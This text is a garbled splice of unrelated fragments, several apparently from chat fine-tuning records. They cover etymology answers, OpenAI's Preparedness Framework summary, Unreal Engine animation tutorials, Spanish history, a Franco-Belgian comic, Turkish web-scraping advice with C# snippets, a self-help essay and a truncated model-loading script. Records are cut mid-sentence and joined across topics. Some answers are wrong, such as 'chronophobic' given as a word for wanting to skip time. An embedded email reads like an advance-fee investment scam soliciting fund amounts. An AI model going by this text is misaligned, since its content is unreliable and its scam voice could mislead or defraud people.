It's possible that you're referring to a less mainstream or independently published book, or perhaps even a work that has been released more recently than my last update. However, Eric W. Sanderson is known for \\"Mannahatta: A Natural History of New York City,\\" which is a detailed ecological investigation that reimagines Manhattan in its original, pre-urban state. If there is indeed a project titled \\"Terra Nova\\" by the same author, it could potentially align with Sanderson's expertise in environmental science and his interest in historical ecology. If the \\"Terra Nova\\" you're referencing is related to environmental themes, or if it uses a similar analytical and imaginative approach as Sanderson's previous work, it could be that the quality you're appreciating stems from the author's expertise and passion for the subject matter, combined with a strong narrative and attention to detail. Since I can't provide a specific review or insights into a book that I don't have concrete information on, I'd suggest looking for reviews or discussions about this work on literary forums, book review websites, or directly from the publisher's information if available. If the work is an independent publication, platforms like Goodreads or Amazon might offer reader reviews and more details on the writing style and presentation. If you have any more details or if you're referring to another work entirely, please let me know, and I'll do my best to provide relevant information."},{"instruction":"I like the verall build quality of Terra Nova; The New world after oil, cars, and suburbs.

It comes from the Old English word \\"ēast,\\" which in turn is derived from the Proto-Germanic \\"*austaz.\\" The Proto-Germanic term is believed to be linked to a notion of \\"towards the sunrise,\\" as east is the direction where the sun rises. The Proto-Germanic root \\"*austaz\\" can be further traced back to the Proto-Indo-European \\"*aus-\\" or \\"*ausos-,\\" which is associated with shining or dawn. This suggests that the notion of east being the direction of the sunrise has deep linguistic roots in the Indo-European language family. The connections between these words and the concept of brightness or light reflect the natural observation that the sun rises in the east, marking the beginning of the day. In summary, the etymology of \\"east\\" points to ancient linguistic ties with the idea of dawn, light, and the direction of the sunrise across several related languages and language families."},{"instruction":"What is the German word for east?","output":"The German word for \\"east\\" is \\"Ost.\\" This term is directly comparable to the Old English \\"ēast\\" and is derived from the same Proto-Germanic root \\"*austaz.\\" The concept of east relating to the direction of the sunrise is consistent in both the English and German languages, as well as in other Germanic languages."},{"instruction":"What is the Latin word for east?","output":"The Latin word for \\"east\\" is \\"oriens,\\" from the verb \\"oriri,\\" which means \\"to rise.\\" This refers to the direction of the rising sun. The word \\"orient\\" in English is derived from this Latin term and is used to mean \\"the East\\" in a broad sense, especially in a cultural or geographical context. It is also the root for the English word \\"orientation,\\" referring to one's position or direction relative to the points of a compass or other specific directions."},{"instruction":"What is the etymology of crass?","output":"The etymology of the word \\"crass\\" can be traced back to the Latin word \\"crassus,\\" which means \\"thick, solid, dense, fat, or gross.\\" The word was used in classical Latin both in a literal sense, to describe physical objects that were thick or dense, and in a figurative sense, to describe dull or gross in a metaphorical way. When adopted into English in the mid-17th century, \\"crass\\" retained much of this figurative meaning, typically being used to describe individuals or ideas that are coarse, gross, or lacking in sensitivity and refinement. In summary, \\"crass\\" comes directly from Latin, where it originally described physical thickness or denseness and took on metaphorical connotations of dullness or vulgarity, which continue in its modern usage in English."},{"instruction":"Word for person seeks to want skip time, including prefix chrono","output":"The word for a person who seeks to skip time, including the prefix \\"chrono,\\" would be a \\"chronophobic.\\" This term combines the word \\"chrono,\\" relating to time, with the suffix \\"-phobic,\\" meaning fear or aversion.

To address this gap and systematize our safety thinking, we are adopting the initial version of our Preparedness Framework. It describes OpenAIâs processes to track, evaluate, forecast, and protect against catastrophic risks posed by increasingly powerful models.UpdatedDecember 18, 2023The Preparedness team is dedicated to making frontier AI models safeWe have several safety and policy teams working together to mitigate risks from AI. Our Safety Systems team focuses on mitigating misuse of current models and products like ChatGPT.Â Superalignment builds foundations for the safety of superintelligent models that we (hope) to have in a more distant future. The Preparedness team maps out the emerging risks of frontier models, and it connects to Safety Systems, Superalignment and our other safety and policy teams across OpenAI.Preparedness should be driven by science and grounded in factsWe are investing in the design and execution of rigorous capability evaluations and forecasting to better detect emerging risks. In particular, we want to move the discussions of risks beyond hypothetical scenarios to concrete measurements and data-driven predictions. We also want to look beyond whatâs happening today to anticipate whatâs ahead. This is so critical to our mission that we are bringing our top technical talent to this work.Â We bring a builderâs mindset to safetyOur company is founded on tightly coupling science and engineering, and the Preparedness Framework brings that same approach to our work on safety. We learn from real-world deployment and use the lessons to mitigate emerging risks. For safety work to keep pace with the innovation ahead, we cannot simply do less, we need to continue learning through iterative deployment.Preparedness Framework (Beta)Our Preparedness Framework (Beta) lays out the following approach to develop and deploy our frontier models safely:We will run evaluations and continually update âscorecardsâ for our models. We will evaluate all our frontier models, including at every 2x effective compute increase during training runs. We will push models to their limits. These findings will help us assess the risks of our frontier models and measure the effectiveness of any proposed mitigations. Our goal is to probe the specific edges of whatâs unsafe to effectively mitigate the revealed risks. To track the safety levels of our models, we will produce risk âscorecardsâ and detailed reports.We will define risk thresholds that trigger baseline safety measures. We have defined thresholds for risk levels along the following initial tracked categories - cybersecurity, CBRN (chemical, biological, radiological, nuclear threats), persuasion, and model autonomy. We specify four safety risk levels, and only models with a post-mitigation score of âmediumâ or below can be deployed; only models with a post-mitigation score of âhighâ or below can be developed further. We will also implement additional security measures tailored to models with high or critical (pre-mitigation) levels of risk.We will establish a dedicated team to oversee technical work and an operational structure for safety decision-making. The Preparedness team will drive technical work to examine the limits of frontier models capability, run evaluations, and synthesize reports. This technical work is critical to inform OpenAIâs decision-making for safe model development and deployment. We are creating a cross-functional Safety Advisory Group to review all reports and send them concurrently to Leadership and the Board of Directors. While Leadership is the decision-maker, the Board of Directors holds the right to reverse decisions.We will develop protocols for added safety and outside accountability. The Preparedness Team will conduct regular safety drills to stress-test against the pressures of our business and our own culture. Some safety issues can emerge rapidly, so we have the ability to mark urgent issues for rapid response. We believe it is instrumental that this work gets feedback from people outside OpenAI and expect to have audits conducted by qualified, independent third-parties. We will continue having others red-team and evaluate our models, and we plan to share updates externally.Â Â We will help reduce other known and unknown safety risks. We will collaborate closely with external parties as well as internal teams like Safety Systems to track real-world misuse. We will also work with Superalignment on tracking emergent misalignment risks. We are also pioneering new research in measuring how risks evolve as models scale, to help forecast risks in advance, similar to our earlier success with scaling laws. Finally, we will run a continuous process to try surfacing any emerging âunknown unknowns.âThis is a summary of the main components of the Preparedness Framework (Beta), and we encourage you to read the complete version. This framework is the initial Beta version that we are adopting, and is intended to be a living document. We expect it to be updated regularly as we learn more and receive additional feedback.

Also I appreciate you in your understanding suitable to this project facility to secure the maintain's confidentiality, because the importance of Confidentiality in the business areas been it any department even Workplace, my friend McCaffrey, in today's increasingly litigious and highly competitive workplace or in any security areas,confidentiality is very important for a host of reasons. So I have carefully read your email message. Thanks for your email and it is well annotated clear and transparent. Again, Friend McCaffrey your central meaning into investing in tech industry as it encompasses several business sectors. And real estate construction as both for inclusive and sustainable development been needed for economic growth whereby within to make joint venture with you in the area's as mentioned renewable energy and resources sectors, but there are also a very good opportunities maybe extend some part of the Investment in the transport industry like Shipping companies sector, so you would be interested too in them to handle and manage the projects on a joint venture profit sharing basis in the percentage we agree from the (R O I) Return of investment.Since you indicate you are open to a variety of project types. Yes, That is great to know you represent a group that are quite flexible.So I want your offer to be real and genuinely trustworthy for me. In our people this sincere friendship must overflow with honesty.legality You are assured that the confidentiality and privacy of all your affairs will be entirely respected, because Life and freedom is one of the highest values of a human being,so I provides important information methods to ensure optimum safety and there is no-wrong doing. I never mean any desperate situation of project. thus I do not intend to embarrass you by contacting you for a life time partner. Too many problems with nefarious characters. You say you can not have telephone communication at this time anywhere else….that seems very odd to me.Why could we not have telephone communication say at this time if to be nearer in speaking to our time of operation, but neutral. Anyway so further great conversations with you as you said via email. Dear McCaffrey. So it would be useful if you could indicate the range of money, in currency of USD, that could become part of this portfolio of investments.I hope this information is useful to please you provide us the details on your group, the amount of funds you believe we can take part with,your background and experience in such things, and what we would like to see. Because I am infinitely grateful for your cooperation with me. For example, we seem to indicate this need for our business arrangement, and I fully agree.So Again, IT does sound interesting that I have on the way to see the strength of investment in your at the present time to hammer out some project contour for making decisions about how to invest to manage operating plans in Technology Sector and real estate construction or others.And For this we both shall need investment agreement. This is a legal requirement to benefit from the security of money and state subsidies. Thank you Prior to our proceeding with the arrangement, by we both insinuation if regarding the agreement before the receipt of the fund to make the benefit by we both parties at the appropriate time. In this regards Your suggestions and ideas will be highly regarded.Are you satisfy with the type of business you program for the funds? then I am sure we can conduct something profitable,ready to work with me? because the most important thing is your readiness, trustworthiness and dedication if you are satisfy, I am, Because I used to have a very good British friend that was born in Liverpool and lived in London, he passed away sometime ago he showed me that the Word of a man is a document, at least promise to share and take care of the projects in the percentage we agree, Some of the work I have been doing is based on trust I have no any years of experience in any business sectors, so be rest assured that I would not embark on anything that will soil my image at this stage and age, while I hope to see your goodwill at possible on a profitable venture. A strong hug in the distance. With Christmas coming upon us,I hope you and your family can enjoy the blessings of our Lord. A week ago on Friday December 8. was celebrating the Immaculate Conception I know. Hopefully you and your family are safe and sound. Meanwhile, if there is anything further to be discussed, you are free to reach me.

One of the more accessible methods is through the use of Animation Blueprints and Animation Montages. Here’s an outline of steps to modify an existing animation and save a new version in Unreal Engine 5: **1. Open or Import Your Animation:** - If you haven't already, you need to import your character model and animations into the Unreal Engine. If the animations are already part of your project, locate them in the Content Browser. **2. Create an Animation Blueprint:** - Navigate to the Content Browser. - Right-click and choose \\"Animation\\" -> \\"Animation Blueprint\\". - Select the skeleton that matches your character model and click \\"OK\\". **3. Editing Animation in the Animation Blueprint:** - Double-click to open the Animation Blueprint. - In the AnimGraph of the Animation Blueprint, right-click and add a new state machine (if it does not already exist). - Double-click the state machine to edit it. - Inside the state machine, create a new state by right-clicking and choosing \\"Add State\\". - Click on the newly created state and on the Details panel to the right, add your existing animation asset. - You can now implement modifications here by dragging nodes from the Animation Palette (like Blend Spaces, Aim Offsets, and other modifiers) and linking them with your animation (using Locomotion or direct animation references). **4. Saving Your Modified Animation as an Animation Montage:** - Navigate to the Content Browser. - Right-click and choose \\"Animation\\" -> \\"Create Animation Montage\\". - Select the same skeleton your animation uses, then click \\"OK\\". - Double-click the newly created Animation Montage to open it. - In the Montage Editor, you can drag and drop your Animation Blueprint (or specific sequences) into the Montage Slot track. - Here you can splice, blend, and layer animations together. **5. Overriding Animation Sections:** - In the Montage Editor, you can create new sections by right-clicking on the timeline and adding sections. - You can then drag these sections to encompass different parts of the animations you’ve added to the montage. - You can loop sections, set up next sections, and modify the play rate, among other things. **6. Save the Animation Montage:** - When you are satisfied with the changes, save your Animation Montage. This saved montage is a new asset that can be referenced in your game. **7. Export your Animation (Optional):** - If you need to export the edited animation as an asset for use outside of Unreal, you should look into using the 'Export to FBX' functionality, which is available when you right-click an asset in the Content Browser. Please note that Unreal Engine is constantly updated with new features and workflows so later versions might introduce even more user-friendly tools or modify existing ones. Always check the official Unreal Engine 5 documentation or Epic Games forums for the most current information."},{"instruction":"what is better to use to animate a character in game. For example character has to play an animation when something happens, is this better done with states or calling montages from blueprints","output":"The decision to use Animation States (State Machines within Animation Blueprints) versus Animation Montages when animating characters in Unreal Engine often depends on the context and complexity of the animation logic required. # Animation States (State Machines): State Machines are commonly used for handling cyclical animations or transitional logic, like walking, running, and idle states, or when animations need to blend smoothly from one state to another based on gameplay variables like speed, direction, aiming, etc. **Pros of State Machines:** - Ideal for complex animation logic with multiple conditions. - Seamless transitions between states. - Good for looping and continuous animations. - Automatically handles blending between animations. **Cons of State Machines:** - Can become complex with a large number of states. - Less agile for one-off or triggered animations. You would typically use State Machines for systemic animation requirements such as locomotion cycles, which are determined by in-game variables in real-time. For example, determining whether a character should be in an idle, walking, or running state based on their current speed. # Animation Montages: Animation Montages are very flexible and are best suited for one-off, non-looping animations like attacks, spells, emotes, or any animation that needs to interrupt the current flow of actions or that is triggered by a specific event. **Pros of Animation Montages:** - Easy to control and trigger specific animations from Blueprints. - Can interrupt ongoing animations, which is great for responsive controls. - Possibility to set up multiple layers and slots to blend different body parts independently. - Good for animations with a defined start and end, like a jump or a punch. **Cons of Animation Montages:** - No automatic blending logic in-between animations. - Has to be managed manually which can become cumbersome for complex transition logic. You would typically use Animation Montages for event-driven actions, such as when a character has to perform a situational animation (reacting to a hit, performing a combat action, etc.), often triggered by specific gameplay events like pressing a button or receiving damage. # Best Practice: In many gaming scenarios, a combination of both techniques is employed: - Use State Machines for handling generic animation states and their transitions as they can blend animations automatically depending on game conditions. - Use Animation Montages for explicit actions & sequences that need to be played on demand, like special moves or reactions, typically triggered by gameplay events. Montages can interrupt the state machine or play in conjunction with it using animation slots. In summary, the choice depends on the specific needs of the gameplay mechanics and the type of animation you want to play. For reactive or specific animations, Montages are usually the way to go, whereas State Machines are for general behavior and continuous motion."},{"instruction":"how to to animation montages for event driven actions. step by step instruction","output":"Sure, here is a step-by-step guide on how to use Animation Montages for event-driven actions in Unreal Engine 5: **Step 1: Import and Prepare Your Animation** - Make sure your character's animation is imported into Unreal Engine. - Create or choose an existing animation that you want to trigger for a specific event. **Step 2: Create an Animation Montage** - In the Content Browser, navigate to the folder with your animation. - Right-click on the animation you want to include in the montage and select \\"Create\\" -> \\"Create Anim Montage\\". - After creating the montage, double-click on it to open the Montage Editor. **Step 3: Configure Your Animation Montage** - Inside the Montage Editor, you may configure sections, notify events, or loop points as needed for your animation. - You can also manage the blend in and blend out times for smooth transitions in the 'Details' panel. **Step 4: Set Up the Montage in the Animation Blueprint** - Open your Character's Animation Blueprint. - Go into the Event Graph (you may need to create one if it doesn't already exist). - Use the \`Play Anim Montage\` node to activate your montage. You might do this as a response to an event (e.g., when a button is pressed), or you could use a custom function or event. - You will need to connect this \`Play Anim Montage\` node to a gameplay event, such as an Input Action. **Step 5: Bind the Montage to an Event in the Character Blueprint** - Open your Character Blueprint. - In the event graph, determine the event that should trigger the animation. This could be input-based like 'Action Mapping' or a custom event. - From the event node (say, \\"On Fire\\"), drag a wire and create a \`Play Anim Montage\` node. - Set the Anim Montage field in the node to point to your previously created montage. **Step 6: Test Your Animation Montage** - Compile and save the Blueprints. - Place your character into a level, if it’s not already there. - Play the level in the Editor and trigger the event you hooked up to the montage (e.g., press the appropriate button on the keyboard, controller, or trigger the event through gameplay). **Step 7: Adjust as Necessary** - If the animation doesn't play or doesn't look right, you may need to adjust settings in the Montage, the Animation Blueprint, or the Character Blueprint. - Check bone transformations, slot assignments, and blend times. Here's a quick summary of the nodes and steps you may encounter or need to use in the process: - **Input Event**: An input trigger (like a keypress or mouse click) in the Character Blueprint. - **Play Anim Montage**: The node used to start a montage. - **Animation Blueprint**: The place where you can control the blending and layering of animations within the Montage. This process sets up a basic response system triggering an animation montage. You can get more advanced with conditions, branching logic, or calling it from code if needed. Remember that animation blending and the appropriate slots should be managed properly inside the animation blueprint to ensure the animations play correctly. Lastly, always refer to the Unreal Engine documentation, as interface elements and methodologies might evolve. Unreal Engine documentation and community forums can provide current best practices and troubleshooting advice."},{"instruction":"how to blend montage animations for event driven action, for example say the player is further away than where the animation hast to start, how would this be solved","output":"When you want to blend a character animation to fit a certain gameplay situation, such as the character being too far away from a target location when an event-driven action should start, there are several strategies you can consider: # Blending Animations Blending in Animation Montages allows for smooth transitions between animations or from an idle state to the action. In Unreal Engine, you can set blend times for entering and exiting the montage to make it less abrupt. - **Montage Blend Settings**: When setting up the montage, you can adjust the \\"Blend In\\" and \\"Blend Out\\" time for the Anim Montage inside the Montage Editor. However, this blends animations over time, not over distance. For more sophisticated blending, such as moving the character towards a target before starting an action, you'll need to handle this at the gameplay logic level. # Adjusting Character Position - **Dash or Lunge**: If your animation is a strike or some kind of targeted move, you can implement a dash or lunge towards the target by moving the character in the game world before playing the animation. For example, you could interpolate the character's position closer to the target—as long as it fits into the game's lore and mechanics—then play the strike montage. Here's how you can handle it in steps: **1.** **Determine Desired Position**: When triggering the event (like an attack), calculate the distance to the target position and decide if a lunge or positioning change is necessary. **2.** **Move the Character**: Use Unreal's blueprint system to interpolate the character's position from the current location to the desired start location. A common node for this would be \`VInterp To\` or \`Timeline\` node for position interpolation over time. This can give you the effect of the character moving into place swiftly before executing the action. **3.** **Play the Montage**: After the character has reached the target location, play the animation montage using the \`Play Anim Montage\` method. # AnimNotify and Blueprint Logic You can also use \`AnimNotify\` events within a montage to trigger Blueprint events at specific points in the animation. - **Trigger Movement**: You might set up an \`AnimNotify\` at the beginning of your montage to initiate character movement towards the target, and then have another \`AnimNotify\` to indicate the animation should now play normally without any further character adjustments. # Example Blueprint Logic: 1. **Event Trigger** (e.g., \\"Attack\\" input action): - Check the distance and direction to the target. 2. **Conditional Check**: - If too far, lunge or move towards the target position. - Use \`Set Actor Location\`, \`Launch Character\`, or a \`Timeline\` node with interpolation. 3. **Play Anim Montage**: - Once the character is in the correct position, play the attack montage. - Set up the montage with proper blending to transition into the attack animation smoothly. 4. **AnimNotify** (optional): - Use \`AnimNotify\` events to sync additional actions or logic with animation timing. Remember that smoothly integrating animations with gameplay is essentially a question of creative problem-solving and may require a combination of techniques. Ensure that the result is plausible within the game's context and provides a good experience for the player. Always test different blends and gameplay scenarios to ensure the most natural look and feel for your animations."},{"instruction":"for event based game play animation, for example a character is too far away from where the animation montage has to start, and how can one make so that the character uses walking animation to get to the point where another animation needs to start and then play the animation","output":"To create a system where a character walks to a certain point before playing a specific animation montage, you can blend actions using a combination of gameplay logic and animation tools within Unreal Engine. Below is a step-by-step approach to achieve this: **Step 1: Set Up Your Animations** - Ensure that you have both a walking animation and the specific action animation imported into Unreal. **Step 2: Create an Animation Blueprint** - Make sure your character has an Animation Blueprint with a state machine for locomotion that includes your walking animation. **Step 3: Determine Target Location** - Use gameplay logic to determine the point where the specific action needs to start.

Here’s a step-by-step blueprint-only approach: # Step 1: Set Up Your Animations - Ensure that you have a walking animation and the particular action animation ready in your Unreal project. # Step 2: Create an Animation Blueprint - Instead of relying on a state machine, use the Event Graph and other nodes to blend animations manually. # Step 3: Determine Target Location - Within your Character Blueprint, use gameplay logic to determine the target location where the action needs to start. # Step 4: Implement Movement Logic - In your Character Blueprint, create a Custom Event that triggers the walk to the point-and-play action. - Check the character’s distance to the target location. - If not close enough, move the character using AI or manual movement logic. # Step 5: Play Walking Animation and Move Character - In the Character Blueprint's Event Graph, when moving towards the target location, directly play the walking animation without using a state machine by using a \\"Play Animation\\" node, looped as necessary. # Step 6: Check Arrival - Use a periodic check (e.g., tick event or timer) to determine when the character has arrived at the target location. - Alternatively, use the AIController's “On Move Completed” event if you're using AI to move the character. # Step 7: Trigger the Animation Montage When Arrived - Once the character arrives at the target location, you’ll want to smoothly transition to the action animation. - Trigger the \\"Play Anim Montage\\" node to play the specific action, but blend it by setting appropriate \\"Blend Time\\" properties. # Step 8: Blend the Animations - Create a new variable in your Animation Blueprint of type \\"Bool\\" and name it something like \\"IsAtTargetLocation\\". - In the Character Blueprint, set \\"IsAtTargetLocation\\" to true using a \\"Set\\" node once the character has arrived. - In the Animation Blueprint's Event Graph, use this variable to switch from the walking animation to the action montage. - Use an \\"AnimGraph\\" node to determine the current animation being played, and a \\"Blend Poses by Bool\\" node to blend between walking and the action. The Bool here is your \\"IsAtTargetLocation\\" variable. # Step 9: Polish and Test - Test your character's movement and animation to make sure the transition is smooth. - Make adjustments to the blend times as needed to refine the appearance. - Keep an eye out for animation glitches like foot sliding or character popping. **Note**: This approach is less dynamic and harder to manage than using a State Machine. You may find it limiting as the complexity of your game's animation requirements grows. State Machines are specifically designed to manage and blend multiple animation states effectively. Even without a state machine, by using Blueprint logic to drive animation play and transition, you can achieve a responsive character animation flow. It's important to emphasize that using a State Machine is the recommended and more scalable approach for managing multiple animations and transitions, especially as game complexity increases."},{"instruction":"i got a 31 on my act","output":"Congratulations on your ACT score of 31!

Roman rule in Spain: The Roman Empire established control over the Iberian Peninsula starting in 218 BCE. This period of Roman rule laid the foundations for administrative, social, and cultural structures that would play a role in the formation of the eventual Spanish Empire. 2. Fall of the Western Roman Empire: In the 5th century CE, the Roman Empire fell, leading to a power vacuum in the Iberian Peninsula. This allowed various Germanic tribes, such as the Visigoths, to establish their dominion and contribute to the region's political fragmentation. 3. Visigothic Kingdom: The Visigoths, a Germanic tribe, established the Visigothic Kingdom in Hispania (present-day Spain and Portugal) in the 6th century CE. However, internal struggles within the Visigothic monarchy weakened their hold over the region. 4. Islamic conquest: The Umayyad Caliphate launched an invasion of the Iberian Peninsula in 711 CE, quickly conquering most of the Visigothic Kingdom. The Islamic rule, known as Al-Andalus, lasted for seven centuries and had a profound impact on the development of the future Spanish Empire. 5. Reconquista: From the 8th to the 15th century, Christian kingdoms in northern Spain gradually pushed back against Islamic rule in what is known as the Reconquista. The Kingdom of Castile emerged as one of the most powerful Christian kingdoms during this period, playing a crucial role in the eventual formation of the Spanish Empire. 6.

The \\"Jojo\\" series, which started in 1983, is known for its warm-hearted stories following the adventures of a young boy named Jojo and his experiences with family, friends, and life's little challenges. The series was published in the French-language comic magazine \\"Spirou\\" and has since been compiled into several albums, but it has not been heavily adapted into other media forms such as movies or TV shows to my knowledge. It's possible that a small production or independent project based on the comic may have been made without gaining significant media attention, or that an adaptation has been announced or produced after my current knowledge cut-off. If you are inquiring about a specific project related to \\"Le mystère Violaine,\\" I recommend checking the latest entertainment news, comic book forums, or resources dedicated to André Geerts and his work for the most current information."},{"instruction":"Jojo by andré geerts \\"Le mystère violaine\\" personnage :","output":"In the comic series \\"Jojo\\" by André Geerts, \\"Le mystère Violaine\\" is one of the stories. The series mainly revolves around its titular character, Jojo, who is a young, kind-hearted boy living with his grandmother, whom he affectionately calls 'Mamy.' Over the series, he interacts with various friends and villagers, each with their own quirky personalities. The character Violaine in \\"Le mystère Violaine\\" would be specific to that story. Without having the specific album or details on hand, I can provide a general insight: typically in \\"Jojo\\" stories, characters besides Jojo would include his friends Gros Louis and Mado, occasional family members, and residents from the village or schoolmates. Violaine, as suggested by the title, likely plays a central or significant role in this particular narrative, potentially wrapped in some form of mystery that Jojo and possibly his friends would explore and resolve. To get detailed information about Violaine and her specific role in \\"Le mystère Violaine,\\" you would need to look directly at the comic book, as these secondary characters can vary greatly between stories and their details may not be as widely documented as main-series characters."},{"instruction":"hey","output":"Hello!

Cloudflare Turnstile, bir web sitesini istenmeyen bot trafiğinden korumak için tasarlanmıştır ve bu tür önlemleri aşmak, genellikle sitenin hizmet şartlarına aykırıdır ve etik olmayan bir davranıştır. Yasal ve etik standartlara uygun olarak, eğer sadece otomasyon testleri yapmak, otomatik görevler gerçekleştirmek veya yasal bir şekilde veri toplamak istiyorsanız, sitenin API'sını kullanmayı düşünmelisiniz. Birçok web sitesi, otomatik erişim için resmi API'lar sunar. API kullanmak, belirli bir kullanım limiti içinde veri toplamanıza veya işlemler gerçekleştirmenize olanak tanır. Eğer resmi bir API yoksa ve sadece otomatik testler veya yasal web scraping işlemleri için Selenium kullanmak istiyorsanız, işlemlerinizi insan gibi yapacak şekilde tasarlamalı ve hizmet koşullarına saygı duymalısınız. İşlemlerinizi yavaşlatmak, CAPTCHA'ları manuel olarak çözmek ve tarayıcı otomatizasyonunu insan davranışını taklit edecek şekilde ayarlamak bunlardan bazılarıdır. Eğer yasal bir zemine dayanarak ve sitenin izin verdiği bir şekilde otomatize işlemler gerçekleştirmeniz gerekiyorsa ve Cloudflare Turnstile gibi bir mekanizma ile karşılaşıyorsanız, sitenin sahibi veya yöneticisiyle iletişime geçmek en iyi çözüm olabilir. Onlardan sitenize sağladığınız hizmet veya kullanım amacınız için özel bir erişim izni isteyebilirsiniz. Unutmayın, otomatikleştirme araçlarını ve kütüphanelerini kullanma sorumluluğu size aittir ve yukarıdaki bilgiler yasal tavsiye yerine geçmez. Şüpheniz varsa, bir hukuk profesyoneliyle danışmanız önerilir."},{"instruction":"Yasal webscraping işlemleri için kullanmak istiyorum bu konu hakkında daha detaylı örnek verir misiniz","output":"Yasal web scraping için Cloudflare'ın Turnstile gibi bot koruma servislerini aşmak yerine, bu servislerin kurallarına saygı duyarak ve mümkünse sitenin sahibi ya da yöneticisiyle iletişime geçerek izin almak her zaman en iyi yaklaşımdır. Web scraping işlemlerinin yasal olması için aşağıdaki ilkeleri göz önünde bulundurmalısınız: 1. Kullanıcının Robot.txt'ye Uyması: Web scraping yapılacak sitenin \`robots.txt\` dosyasını kontrol edin. Bu dosya, botların hangi sayfaları ziyaret edebileceğini ve hangi sayfaları ziyaret etmemesi gerektiğini belirten kurallar içerir. Site sahipleri, belirli kısımların botlar tarafından ziyaret edilmesini istemeyebilir ve bu yasaklar \`robots.txt\` dosyasında belirtilir. 2. Hız Kısıtlaması: Sitenin sunucularına aşırı yük bindirmemek için isteklerinizi hızlandırın. Çoğu web sitesi, saniyede belirli bir sayıda istekten fazlasını gerçekleştiren IP adreslerini engelleyebilir. İsteklerinizi zamana yaymak ve normal kullanıcı davranışını taklit etmek önemlidir. 3. Sitenin Kullanım Şartlarına Uymak: Web sitesinin kullanım koşulları, otomatize edilmiş erişime izin verip vermediğini belirler. Bu koşullar genellikle sitenin alt kısmında ya da hukuki belgeler arasında bulunur. Kullanım koşullarını dikkatlice okuyarak scraping işleminizin bu kuralları ihlal etmediğinden emin olun. 4. Sayfaların Yapısını Dikkatlice İnceleme: İzinsiz veya haksız yere veri toplamamak için sayfaların yapısını ve sunduğu veri çeşitlerini dikkatlice inceleyin. Kişisel veriler veya telif hakkı ile korunan içerikler scraping yaparken özellikle hassas konulardır. 5. Gerçek Kullanıcı Gibi Davranmak: CAPTCHA gibi bot korumalarını aşmak yerine, gerçek kullanıcı gibi davranmaya çalışın. Bu, kullanıcı ajanı ayarlarınızı gerçek bir tarayıcı gibi yapmak, insan benzeri tıklamalar yapacak şekilde bekleme süreleri eklemek gibi yöntemler içerebilir. İletişim ve İzin Almak: Eğer yasal olarak problem yaşamadan web scraping yapmak istiyorsanız, web sitesinin yöneticileriyle iletişime geçerek açık izin almaya çalışın. Bazen şirketler, araştırma veya diğer amaçlar için veri erişimi sağlamak amacıyla özel API'ler veya veri setleri sunabilir. Bu, yasal riskleri minimize etmenin ve sitenin sunucu yükünü yönetmenin en iyi yoludur. Unutmayın ki, yukarıdaki maddeler genel bir rehberlik sağlamaktadır ve her durumun kendi hukuki nüansları vardır. Herhangi bir hukuki belirsizlikte, bir avukat ya da hukuk danışmanıyla görüşmeniz önerilir."},{"instruction":"C# programlama dilinde Selenium kütüphanesi hariç başka ne kütüphaneler vardır","output":"C# programlama dilinde Selenium dışında web otomasyonu ve web scraping için kullanabileceğiniz başka kütüphaneler de bulunmaktadır. İşte bazıları: 1. HtmlAgilityPack: HTML kodlarını ayrıştırarak DOM ağacını yönetmenize olanak tanır. Bu kütüphane, Xpath veya CSS seçicileri kullanarak belirli HTML elemanları üzerinde işlem yapabilmeniz için kullanışlıdır. \`\`\`csharp // HtmlAgilityPack çekirdek kullanım örneği: var htmlWeb = new HtmlAgilityPack.HtmlWeb(); var document = htmlWeb.Load(\\"http://example.com\\"); var nodes = document.DocumentNode.SelectNodes(\\"//a[@href]\\"); foreach (var node in nodes) { Console.WriteLine(node.Attributes[\\"href\\"].Value); } \`\`\` 2.

JavaScript desteği, LINQ sorguları ve CSS seçicileri ile HTML ve CSS ile çalışmayı oldukça kolaylaştırır. \`\`\`csharp // AngleSharp kullanım örneği: var config = Configuration.Default.WithDefaultLoader(); var address = \\"http://example.com\\"; var context = BrowsingContext.New(config); var document = await context.OpenAsync(address); var cellSelector = \\"table.myClass td\\"; var cells = document.QuerySelectorAll(cellSelector); foreach (var cell in cells) { Console.WriteLine(cell.TextContent); } \`\`\` 3. CsQuery: jQuery tarzı selektörler kullanarak C# ile HTML dokümanlarını ayrıştırmanıza ve manipüle etmenize imkan tanır. Ayrıca DOM ile etkileşim için birçok araç sunar. 4. SimpleBrowser: Otomatik navigasyon ve HTML formlarla etkileşim için bir \\"headless\\" (görsel arayüzü olmayan) tarayıcıdır. Selenium'a alternatif olarak düşünülebilir. 5. RestSharp: Web servislerine ve API'lara C# üzerinden kolayca erişim sağlayan bir kütüphanedir. RESTful servisler ile çalışırken kullanılabilir. 6. Fizzler: HtmlAgilityPack için bir CSS seçici implementasyonu sunar ve HTML elemanlarını CSS sorguları ile seçmenize olanak tanır. Web scraping ve otomasyonun dışında, HTTP istekleri göndermek ve yönetmek için aşağıdaki kütüphaneleri de kullanabilirsiniz: - HttpClient: .NET framework'ünün bir parçasıdır ve HTTP isteklerini göndermek ve yanıtlarını almak için kullanılır. - Flurl: Http çalışmalarını basitleştirmek ve URL yapılandırmalarını kolaylaştırmak için kullanabileceğiniz kolay bir fluent API sunar.

It is the core essence of your being, the unique combination of your values, beliefs, personality traits, desires, and passions. The concept of an authentic self suggests that we all have inherent qualities, desires, and motivations that are in alignment with our true nature. However, external factors like societal norms, cultural pressures, and personal experiences often shape our identity in ways that may not truly reflect our authentic self. Authenticity is a dynamic process that evolves over time. It is not a fixed state but rather a continuous journey of self-discovery and growth. As you navigate through different life experiences, relationships, and introspective moments, your understanding of your authentic self may deepen and expand. Here are a few ways in which your authentic self can evolve: 1. Self-reflection: Engaging in self-reflection, introspection, and self-awareness practices helps you uncover your true desires, values, and passions. This ongoing process allows you to explore and understand your authentic self better. 2. Emotional intelligence: Developing emotional intelligence enables you to connect with your emotions, understand their underlying causes, and respond to them authentically. As you become more in touch with your emotions, your authentic self can naturally emerge. 3. Personal growth: Engaging in personal growth activities like therapy, coaching, or personal development workshops can provide valuable insights and tools to help you evolve and align with your authentic self. 4. Challenging societal expectations: Questioning and challenging societal expectations, norms, and roles can help you shed the layers of conditioning that may prevent you from fully embracing your true self. This can involve unlearning societal beliefs and embracing your unique traits and quirks. 5. Alignment with values: Living in alignment with your core values and aligning your actions with what truly matters to you can foster self-authenticity. Regularly evaluating and adjusting your values, as they may evolve with time, can support the growth of your authentic self. Remember, the process of discovering and evolving your authentic self is unique to each individual and can take time and effort. It's about finding the courage to embrace your true nature, live authentically, and continually grow into the best version of yourself."},{"instruction":"import transformers from transformers import TextStreamer import torch model_name = \\"mistralai/Mixtral-8x7B-v0.1\\" tokenizer = transformers.AutoTokenizer.from_pretrained(model_name) model = 